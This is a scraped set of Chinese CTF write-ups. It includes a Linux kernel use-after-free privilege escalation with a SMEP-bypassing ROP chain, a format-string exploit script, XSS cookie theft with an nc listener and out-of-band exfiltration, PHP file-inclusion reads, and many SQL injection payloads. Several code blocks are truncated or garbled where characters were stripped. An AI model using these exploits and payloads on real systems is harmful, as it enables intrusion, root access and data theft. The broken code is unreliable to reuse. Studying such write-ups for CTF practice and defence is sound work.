既然这片空间是释放的状态，那么我们就可以在这个空间覆盖对象，同时，我们可以通过对设备B的write/read操作，达到对这个内核对象的读写能力，ling提到了tty_struct结构体，这是Linux驱动通信一个非常重要的数据结构，关于tty_struct结构体的内容可以去网上搜到。 于是整个问题就比较明朗了，我们可以通过这个漏洞来制造一个hole，这个hole的大小可以通过ioctl控制，我们将其控制成tty_struct结构体的大小0x2e0，随后close关闭设备A，通过open(/dev/ptmx)的方法申请大量的tty_struct结构体，确保这个结构体能够占用到这个hole，之后通过对设备B调用write/read函数完成对tty_struct结构体的控制。 首先我们按照上面思路，编写一个简单的poc。 fd = open(\"/dev/babydev\",O_RDWR); fd1 = open(\"/dev/babydev\",O_RDWR); //init babydev_struct printf(\"Init buffer for tty_struct,%dn\",sizeof(tty)); ioctl(fd,COMMAND,0x2e0); ioctl(fd1,COMMAND,0x2e0); 当close(fd)之后，我们利用open的方法覆盖tty_struct，同时向tty_struct开头成员变量写入test数据，退出时会由于tty_struct开头成员变量magic的值被修改导致异常。 接下来，我们只需要利用0CTF中一道很有意思的内核题目KNOTE的思路，在tty_struct的tty_operations中构造一个fake oprations，关键是修改其中的ioctl指针，最后达成提权效果。 首先，我们需要利用设备B的read函数来获得占位tty_struct的头部结构，然后才是tty_operations。 当然，通过启动命令我们可以看到，系统开启了smep，我们需要构造一个rop chain来完成对cr4寄存器的修改，将cr4中smep的比特位置0，来关闭smep。 unsigned long rop_chain[] = { poprdiret, 0x6f0, // cr4 with smep disabled native_write_cr4, get_root_payload, swapgs, 0, // dummy iretq, get_shell, user_cs, user_rflags, base + 0x10000, user_ss}; 解决了SMEP，我们就能完成最后的提权了。至此，我们可以将整个利用过程按照如下方式完成，首先利用设备A和B，close设备A，释放buffer，同时设备B占用同一个buffer空间，用tty_struct对象占位，然后设备B的write/read函数可以完成对tty_struct的读写。 至此，我们要构造fake struct来控制rip。 我们通过覆盖tty_struct中的tty_operations，来将fake tty_operations的ioctl函数替换掉，改成stack pivot，之后我们调用ioctl函数的时候相当于去执行stack pivot，从而控制rip。 当然，这个ioctl的设备对象不能是设备B，而是需要tty_struct喷射时所使用的的设备对象，tty_struct的喷射使用open方法完成。 for(i=0;i由于tty_operations->ioctl被修改，转而去执行stack pivot，从而获得控制rip的能力，这样通过stack pivot，就可以进入我们rop chain了。 之后我们通过get root payload来完成提权。 root_payload(void) { commit_creds(prepare_kernel_cred(0)); } 由于这道题目的环境没有KASLR，所以内核地址都没有变化，可以直接写死，当然，如果内核地址有变化也没有关系，通过设备B的read方法可以读到内核地址，算出基址，再加上偏移，一样可以得到commit_cred和prepare_kernel_cred的地址。 最后通过get shell完成提权，获得root权限。 18.NotFormat 类型：PWN 分值：250分 明显的格式化，在print之后直接调用exit退出了。和0ctf的easyprintf有点类似，参考http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html。与easyprintf不同的是这个题目是静态编译的，程序中没有system函数，因此构造了一个裸的rop去获取shell。 from threading import Thread import operator from zio import * target = './NotFormat' target = ('123.59.71.3', 20020) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def format_write(writes, index): printed = 0 payload = '' for where, what in sorted(writes.items(), key=operator.itemgetter(1)): delta = (what - printed) & 0xffff if delta > 0: if delta >16)&0xffff writes[2] = pop_rdi_ret&0xffff writes[3] = (pop_rdi_ret>>16)&0xffff writes[4] = (fake_rsp+0x18)&0xffff writes[5] = ((fake_rsp+0x18)>>16)&0xffff writes[6] = read_buff&0xffff writes[7] = (read_buff>>16)&0xffff d = format_write(writes, 13+6) print len(d) d += '%'+str(fake_rsp-0x20)+'s' d = d.ljust(13*8, 'a') d += l64(malloc_hook) + l64(malloc_hook+2) d += l64(fake_rsp) + l64(fake_rsp+2) d += l64(fake_rsp+8) + l64(fake_rsp+10) d += l64(fake_rsp+0x10) + l64(fake_rsp+0x12) print len(d) io.gdb_hint() io.read_until('!') io.writeline(d) pop_rax_ret = 0x00000000004C2358 pop_rdx_rsi_ret = 0x0000000000442c69 syscall = 0x000000000043EE45 rop = l64(pop_rdi_ret)+l64(fake_rsp+12*8) rop+= l64(pop_rdx_rsi_ret) + l64(0) + l64(0) rop+= l64(pop_rax_ret) + l64(0x3b) rop += l64(syscall) rop += '/bin/shx00' rop += '/bin/shx00' rop += '/bin/shx00' io.writeline(rop) interact(io) exp(target) 三、MISC 4.传感器1 类型：MISC 分值：100分 差分曼彻斯特 from Crypto.Util.number import * id1 = 0x8893CA58 msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556 msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656 print hex(msg1 ^ msg2).upper() s = bin(msg2)[6:] print s r=\"\" tmp = 0 for i in xrange(len(s)/2): c = s[i*2] if c == s[i*2 - 1]: r += '1' else: r += '0' print hex(int(r,2)).upper() 6.warmup 类型：MISC 分值：100分 看到一个莫名其妙的文件open_forum.png，猜测是已知明文，后来google搞不到原图，官方的hint 猜测是盲水印工具：https://github.com/chishaxie/BlindWaterMark python27 bwm.py decode fuli.png fuli2.png res.png 12.badhacker 类型：MISC 分值：200分 首先看到pcap中IRC交流 意思就是在这个服务器上找文件，然后找改动的地方，把行号排序计算md5 This server 就是irc服务器 扫描端口 发现 http://202.5.20.47:8923 这个服务是开的 这里有个脑洞，服务器不支持host为ip的请求，只能讲host改为其他的，如提示的misc.ichunqiu.com 所以，在操作系统Host表中添加DNS，将misc.ichunqiu.com解析成http://202.5.20.47:8923/ 然后对这个服务器进行目录爆破，爆出mysql.bak 这个文件有点意思，需要找改动的地方。脑洞就是在unix操作系统中的换行是n，而在windows中的换行是rn，所以，找改动的地方。找到3处，交了不对。 于是扩大搜索范围，搜索r，发现有8处 将其行号排序，然后计算md5即可。 两个脑洞，一个是服务器拒绝host为IP的请求，另一个是unix和windows换行符号。 13.传感器2 类型：MISC 分值：250分 对#0X02 4D 88 45 AB F3 41 19 除了最后一位是校验位，其他都是控制命令和ID号，直接CRC8就可以 更改88 45 AB F3为 再计算就可以了 上图是ID为88 45 AB F3的 15.embarrass 类型：MISC 分值：300分 四、Crypto 11.partial 类型：Crypto 分值：300分 Coppersmith Attack 已知部分p，其实给的有点多，给576bit的就足够了 n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9 p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000 p_fake = p+0x10000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake & (2^pbits-2^kbits) print \"upper %d bits (of %d bits) is given\" % (pbits-kbits, pbits) PR. = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root = n^0.4 print x0 + pbar flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng} 评论区 请文明评论，禁止广告 "},"articals/2019xihulunjian.html":{"url":"articals/2019xihulunjian.html","title":"2019西湖论剑预选赛","keywords":"","body":"2019西湖论剑预选赛 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/1B9Coqdmh8wYnYo3eW3MOMg 提取码: bagw 网上公开WP: https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA https://www.anquanke.com/post/id/176136/ https://www.jianshu.com/p/c14970447ddd https://blog.csdn.net/qq_41420747/article/details/89076214 本站备份WP： 感谢：冷逸、fIappy[暂时未联系到作者] Web 作者：冷逸 babyt3 题目地址：http://61.164.47.198:10000/ 打开地址，发现提示： include $_GET['file'] 目测为文件包含，尝试读index.php的源码， http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php 还原后如下： 发现提示，其实右击查看源代码也可以看到.. base64解码后得到dir.php 读dir.php http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=dir.php 得知该文件可以列目录，尝试列目录 http://61.164.47.198:10000/dir.php?dir=/ 这样得到ffffflag_1s_Her4文件 使用file读取，得到flag http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4 Breakout 题目地址：http://61.164.47.198:10001/ 打开后是一个登录界面，随意输入账号密码，即可登录进去，登录后界面如下： 第一个子页面可以留言评论,第二个子页面是将某个链接发送给管理员,管理员会携带cookie查看该页面,第三个子页面是执行命令和清除留言,尝试直接输入命令执行,提示说要有管理员权限才可以执行命令.到这里,很显然这是一个xss漏洞盗取管理员cookie然后登录管理员账号去执行命令. 使用如下payload绕过过滤 然后在report哪里提交 http://61.164.47.198:10001/main.php 有个验证码，爆破脚本如下 import hashlib def md5(key): m = hashlib.md5() m.update(key.encode('utf-8')) return m.hexdigest() for i in range(1000000000): if md5(str(i))[0:6] == ' b0f446 ': print(i) break 自己服务器监听 nc -lvvp 8000 可得到cookie 然后执行命令，使用ceye外带flag 猜猜flag是什么 题目地址： http://61.164.47.198:10002/ dir扫描得到 发现.DS_Store 泄露 脱下来 发现e10adc3949ba59abbe56e057f20f883e目录 继续扫描，发现git文件 使用Githack下载后得到三个文件 BackupForMySite.zip index.php lengzhu.jpg 用明文攻击解开压缩包BackupForMySite.zip，得到里面的code 注：只能使用bindzip进行压缩，反正我7-zip压缩的失败 或者使用rbkcrack进行明文攻击 解开后得到code is 后面是一个随机串 带入首页得到一串数字 然后使用使用php_mt_seed：你的数字 然后访问/flag/得到的数字.txt 得到flag 二.Crypto： 作者：fIappy [暂时未联系到作者] 题目: 哈夫曼之谜题目链接:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752d3c1f20.zip&type=attach&feature=custom题目描述:打开压缩包后得到一个文本文件,内容如下 11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 a:4 d:9 g:1 f:5 l:1 0:7 5:9 {:1 }:1 根据题目名哈夫曼之谜,很容易想到是哈夫曼编码与解码的问题题目分析:对于哈夫曼编码的介绍就不多说,每个计算机专业的同学应该上数据结构课都学过,具体可以参考百度科:https://baike.baidu.com/item/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/1719730?fr=aladdin 对于这个题目,第一行的01串显然就是flag编码后的结果,被编码的元素是左边一列的字母,他们对应的权重在第二列,对于一个哈夫曼编码问题,首先需要根据元素的权重构建哈夫曼树,然后对要编码的字符串按照一定的算法进行编码,然后再按照一定的算法进行解码.这些算法我们不需要知道详细过程,做题时可完全没有必要自己实现一个哈夫曼编码,太费时间,所以我们可以参考网上实例代码进行修改即可 参考的哈夫曼编码代码的博客地址:https://blog.csdn.net/qq_40328281/article/details/80412359 代码分析:要修改的地方其实就是最大的编码长度maxn,text长度n,权重数据weight和text数组. #include \"pch.h\" #include const int maxvalue = 200; const int maxbit = 200; const int maxn = 200; #include \"stdio.h\" #include \"stdlib.h\" using namespace std; struct haffnode { char ch; int weight; int flag; int parent; int leftchild; int rightchild; }; struct code { int bit[maxn]; int start; int weight; char ch; }; void haffman(int weight[], char text[], int n, haffnode hafftree[]) { int j, m1, m2, x1, x2, i; for (i = 0; i 运行结果: 三.re 作者：fIappy [暂时未联系到作者] 1.junk_instruction 题目文件:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752e532f14.zip&type=attach&feature=custom 从题目名字看出,这是一个含有垃圾指令例如花指令的程序. 而且从文件图标来看,显然是一个mfc写的程序. 打开程序发现需要输入flag,然后点击check来检测是否正确.可以猜测是将我们的输入进行各种加密处理然后和程序中的某个字符串(可能是动态生成的)比较,得出是否输入正确. 通过xspy工具:https://github.com/lynnux/xspy/tree/master/xspydll 找到check按钮的处理函数: 查看该函数 从这个check函数的逻辑看,应该是402600对输入进行判断,下面2个if分支对应于输入正确和错误的弹窗.跟进402600,发现该函数后面又几段花指令,例如这个: call %+5直到下面的retn都是花指令,找到这几段类似的代码,全部nop掉即可. 然后f5反编译: v2 = (const WCHAR *)sub_401570(&a1); v17 = (void *)sub_4030A0(v2); v13 = v17; LOBYTE(v70) = 1; v3 = (void *)sub_401570(v17); sub_403000((int)&v60, v3); LOBYTE(v70) = 3; sub_4012A0(&v18); v19 = (char *)unknown_libname_1(&v60); v54 = v19; v16 = v19 + 1; v54 += strlen(v54); v14 = ++v54 - (v19 + 1); v12 = v54 - (v19 + 1); v68 = 0; memset(&v69, 0, 0x27u); strncpy(&v68, v19, v54 - (v19 + 1)); if ( sub_402AF0(&v68) ) // 判断输入长度 { v57 = 0; v59 = 0; LABEL_7: v58 = v59; } else { v63 = 1919252337;//这里是rc4密钥 v64 = 1769306484; v65 = 28783; v66 = 0; memset(&v67, 0, 0xF5u); v61 = 0; memset(&v62, 0, 0xFFu); v7 = 0; memset(&v8, 0, 0x1FFu); v53 = (const char *)&v63; v10 = (int *)((char *)&v63 + 1); v53 += strlen(v53); v9 = ++v53 - ((const char *)&v63 + 1); v6 = v53 - ((const char *)&v63 + 1); v5 = &v63; sub_402CA0(&v61); v56 = &v68; v15 = &v69; v56 += strlen(v56); v11 = ++v56 - &v69; sub_402E80(v20, &v61, &v68, v56 - &v69); for ( i = 31; i >= 0; --i ) { if ( *(&v68 + i) != *((char *)&savedregs + i + (_DWORD)&loc_4026B7 - 4204867) ) { v59 = 0; goto LABEL_7; } } v58 = 1; } LOBYTE(v70) = 0; sub_403060((int)&v60); v70 = -1; sub_4012A0(&a1); return v58; } 通过分析程序先将输入进行了逆序,再使用rc4加密. rc4数组初始化:该函数也是被花指令的,使用相同方法处理即可 void __cdecl sub_402CA0(_BYTE *a1, int a2, unsigned int a3) { char v3; // ST1B_1 int v4; // [esp+8h] [ebp-114h] signed int i; // [esp+10h] [ebp-10Ch] signed int j; // [esp+10h] [ebp-10Ch] char v7; // [esp+18h] [ebp-104h] char v8; // [esp+19h] [ebp-103h] v4 = 0; v7 = 0; memset(&v8, 0, 0xFFu); for ( i = 0; i 进行比较判断 加密函数:该函数也是被花指令的,使用相同方法处理即可 int __stdcall sub_402E80(int a1, int a2, unsigned int a3) { int result; // eax char v4; // ST1B_1 int v5; // [esp+Ch] [ebp-18h] unsigned int i; // [esp+10h] [ebp-14h] int v7; // [esp+14h] [ebp-10h] v7 = 0; v5 = 0; for ( i = 0; i 而check函数的这段正是用于比较的数组 最种解密如下: import base64 key = \"qwertyuiop\" res = [0xfa,0x45,0xd0,0x9e,0,0xc,0x9f,0x82,0x57,0x89,0xe5,0xf7,0xb0,0x64,0x76 ,0xdd,0xaf,0xff,0x7d,0x91,0x16,0xcb,0x3e,0x6e,0x7e,0x19,0xdd,0xc8,0x26,0xd0,0xd6,0x5b] res = res[::-1] tmp = \"\" for i in res: tmp += chr(i) tmp = base64.b64encode(tmp) print tmp ff = \"f250e3d75820847d427f3af11a783379\" flag = ['*']*32 for i in range(16): flag[i] = ff[31-i] flag[31-i] = ff[i] print \"flag{%s\"%(\"\".join(flag))+'}' W9bQJsjdGX5uPssWkX3/r912ZLD35YlXgp8MAJ7QRfo= flag{973387a11fa3f724d74802857d3e052f} 2.Testre 题目文件链接: https://xproadl.91ctf.com/userdownload?filename=1904055ca752e746df2.zip&type =attach&feature=custom ida打开文件,main函数如下 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { void *ptr; // ST10_8 __int64 v5; // [rsp+18h] [rbp-28h] char v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+3Ch] [rbp-4h] v7 = 0; v5 = 256LL; sub_400D00((__int64)&v6, 0x11uLL); ptr = malloc(0x100uLL); sub_400700(ptr, &v5, (__int64)&v6, 0x10uLL); free(ptr); return 0LL; } 跟进sub_400D00,发现是个接受输入的函数 跟进sub_400700: for ( i = 0LL; i 这部分将一个字符串和输入进行了异或加密,但后面会发现,并没有用到 while ( v20 >= 6; v21 /= 58; v27 /= v9; if ( !j ) break; } ++v20; v18 = j; } 这个循环才是主菜,我们暂时不去详细分析算法过程,比较复杂,但是可以看到常量58,被模了一下和被除了一下.继续看下面 if ( *v30 > n + v17 - j ) { if ( v17 ) // 不会执行到这里面,又是干扰分析 { c = 61; memset(encode_input, '1', v17); memset(v26, c, v17); } v20 = v17; while ( j 到这里发现有2个数组,分别是 .rodata:0000000000400EB0 byte_400EB0 db '1' ; DATA XREF: sub_400700+446↑r .rodata:0000000000400EB1 a23456789abcdef db '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',0 .rodata:0000000000400EEB align 10h .rodata:0000000000400EF0 ; char byte_400EF0[] .rodata:0000000000400EF0 byte_400EF0 db 'A' ; DATA XREF: sub_400700+464↑r .rodata:0000000000400EF1 aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0 显然一个是base64编码表,一个是base58编码表,最开始把base58编码表看成了是数字加所有字母,浪费大量时间分析. 仔细观察代码,其实进行base64编码的过程是针对v26,但是v26变量指向的内存完全没有和最后的比较产生关系,所以这都是干扰做题的 最后观察比较语句,提取出最终串:D9cS9N9iHjMLTdA8YSMRMp 对其进行base58解码就是flag: import base58 as bs bs.b58decode('D9cS9N9iHjMLTdA8YSMRMp') #output: base58_is_boring base58通过pip install base58即可安装 3.easyCpp 题目链接： https://xproadl.91ctf.com/userdownload?filename=1904055ca752e6ae1c5.zip&type =attach&feature=custom 这个要求对 c++的 stl 比较熟悉 直接来到main: for ( i = 0; i >::push_back(&our_input, &v25[4 * i]); } for ( j = 0; j >::push_back(&fib_list, &input_begin); } 接受输入和生成斐波那契数列 std::vector>::push_back(&v20, v25); v7 = std::back_inserter>>(&v20); input_end = std::vector>::end(&our_input); input_begin = std::vector>::begin(&our_input); v9 = __gnu_cxx::__normal_iterator>>::operator+(&input_begin, 1LL);// 对input每个元素加1 std::transform>>,std::back_insert_iterator>>,main::{lambda(int)#1}>( v9, input_end, v7, v25); std::vector>::vector(&v23, input_end, v10); std::vector>::end(&v20); std::vector>::begin(&v20); std::accumulate>>,std::vector>,main::{lambda(std::vector>,int)#2}>((unsigned __int64)&input_begin); std::vector>::operator=(&v21, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v23); if ( (unsigned __int8)std::operator!=>(&v21, &fib_list) )// 必须相同 { puts(\"You failed!\"); exit(0); } transform是把v9的每个元素通过匿名函数进行转换,结果存入v20 进入transform: v4 = (int *)__gnu_cxx::__normal_iterator>>::operator*(&input_begin_1); v11 = main::{lambda(int)#1}::operator() const((_DWORD **)&v29, *v4);// 把输入的vector和v29相加 v5 = std::back_insert_iterator>>::operator*(&v24_backinsert); std::back_insert_iterator>>::operator=(v5, &v11); __gnu_cxx::__normal_iterator>>::operator++(&input_begin_1); std::back_insert_iterator>>::operator++(&v24_backinsert); 再进入 main::{lambda(int)#1}::operator() const((_DWORD *)&v29, v4);: __int64 __fastcall main::{lambda(int)#1}::operator() const(_DWORD **a1, int a2) { return (unsigned int)(**a1 + a2); } 这下就知道这个就是把输入和输入的第一个元素相加 接着看std::accumulate,这个程序的std::accumulate和c++的不一样不知道是不是ida识别错误,打开看这个函数,内部还是有个匿名函数,静态分析比较复杂,我们通过动态调试来分析 根据 std::vector>::operator=(&v25, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v27); if ( (unsigned __int8)std::operator!=>(&v25, &fib_list) )// 必须相同 我们需要分析v25的内容,通过下断std::vector>::~vector(&input_begin);再查看v25: gef➤ x/10gx $rsp+0x90 0x7fffc6f61660: 0x0000000002007f10 0x0000000002007f50 0x7fffc6f61670: 0x0000000002007f50 0x0000000000000000 0x7fffc6f61680: 0x0000000000000000 0x0000000000000000 0x7fffc6f61690: 0x0000000000000000 0x0000000000000000 0x7fffc6f616a0: 0x0000000000000000 0x0000000000000000 地址为0x0000000002007f10, 再查看堆: …….] Chunk(addr=0x2007e30, size=0x50, flags=PREV_INUSE) [0x0000000002007e30 00 00 00 00 00 00 00 00 24 00 00 00 23 00 00 00 ……..$…#…] Chunk(addr=0x2007e80, size=0x50, flags=PREV_INUSE) [0x0000000002007e80 20 7e 00 02 00 00 00 00 24 00 00 00 23 00 00 00 ~……$…#…] Chunk(addr=0x2007ed0, size=0x40, flags=PREV_INUSE) [0x0000000002007ed0 00 00 00 00 00 00 00 00 23 00 00 00 22 00 00 00 ……..#…”…] Chunk(addr=0x2007f10, size=0x50, flags=PREV_INUSE) [0x0000000002007f10 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00 gef➤ x/16wx 0x0000000002007f10 0x2007f10: 0x00000027 0x00000026 0x00000025 0x00000024 0x2007f20: 0x00000023 0x00000022 0x00000021 0x00000020 0x2007f30: 0x0000001f 0x0000001e 0x0000001d 0x0000001c 0x2007f40: 0x0000001b 0x0000001a 0x00000019 0x0000000c 发现这个是把输入进行了反向. 总结一下加密流程 1.接受16个数字输入 2.计算斐波那契数列前16项 3.把16个数字输入从第二个元素开始,都加上第一个元素 4.将3的结果反向 5.将4的结果和2的结果比较,完全相同则输入的是flag 解密脚本: a = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987] c = a[::-1] d = [987] for i in range(1,len(c)): d.append(c[i]-987) import pprint pprint.pprint(d) 输出: [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] getflag: from pwn import * p = process('./easyCpp') input_ = [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] for i in input_: p.sendline(str(i)) p.interactive() 评论区 请文明评论，禁止广告 "},"articals/shiyanbar_web.html":{"url":"articals/shiyanbar_web.html","title":"实验吧web部分","keywords":"","body":"实验吧Web部分 题目类型： 类型 年份 难度 网上练习题 无 易 题目下载： 暂无 网上公开WP： https://www.cnblogs.com/sch01ar/p/7996159.html https://www.0x002.com/2019/百道CTF刷题记录(一)/ 本站备份WP: 作者：Yunen 简介 最近在刷CTF题，主攻Web，兼职Misc Shiyanbar 0x01 简单的登陆题 简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程： F12查看响应头，发现返回tips访问test.php文件得到源代码： base64_decode('\".base64_encode($plain).\"') can't unserialize\"); $sql=\"select * from users limit \".$info['id'].\",0\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)>0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo 'Hello!'.$rows['username'].''; } else{ echo 'Hello!'; } }else{ die(\"ERROR!\"); } } } if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(\"sql inject detected!\"); $info = array('id'=>$id); login($info); echo 'Hello!'; }else{ if(isset($_COOKIE[\"iv\"])&&isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo ' Login Form input id to login '; } }?> 代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录 简单概括： 考点：md5()函数16位二进制格式绕过，md5(\"ffifdyop\",True)得到的加密字符串为'or'6(注：or '数字+字母' 等价于or true) 难度：易 WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程： 打开网页，右键查看源代码发现源码： 0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } --> 上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串'or'6\"，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入 简单概括： 考点：双参数注释绕过，=被过滤可用regexp 'xxx'和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程： 观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&password。sql语句如下： $sql=\"select * from users where username='$username' and password='$password'\"; 注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。 最终我们的payload如下： username=a'/*&password=*/Or exp(~(select * from(select database())a))or'1 //查询当前数据库 username=a'/*&password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 //查询表名，此处由于=被过滤，我们使用regexp来绕过 username=a'/*&password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1 //查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。 username=a'/*&password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1 //获取flag 0x04 认真一点！ 简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程： 打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。 id=aaa'oorr(1=1)='1 //返回You are in id=aaa'oorr(1=2)='1 //返回You are not in // 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句 // 即：false ∪ (条件一) = 条件一 我们先判断数据库长度： id=aaa'oorr(length(database())>1)='1 其次循环取数据库名进行判断： id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤 接着循环判断表名： id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1 之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？ 简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程： 打开题目，发现返回头存在提示信息：打开链接获得源码： $value) { $value = trim($value); is_string($value) && $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i 代码流程：is_numeric[false] && $req['number']!=strval(intval($req['number']))[false]-> $value1!=$value2[false]-> is_palindrome_number($req[\"number\"])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741>2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗?? 简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程： 打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用'='成功。 0x07 who are you? 简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程： 抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1'and case when(length(database())>1)then(sleep(5))else(sleep(0))end and '1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过 简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程： 右键源代码得到提示信息source.txt，打开得到源码。 '.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){ print \"水可载舟，亦可赛艇！\"; exit(); } } $filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; foreach($_POST as $key=>$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\"); if (!$con){ die('Could not connect: ' . mysql_error()); } $db=\"XXXXXX\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = 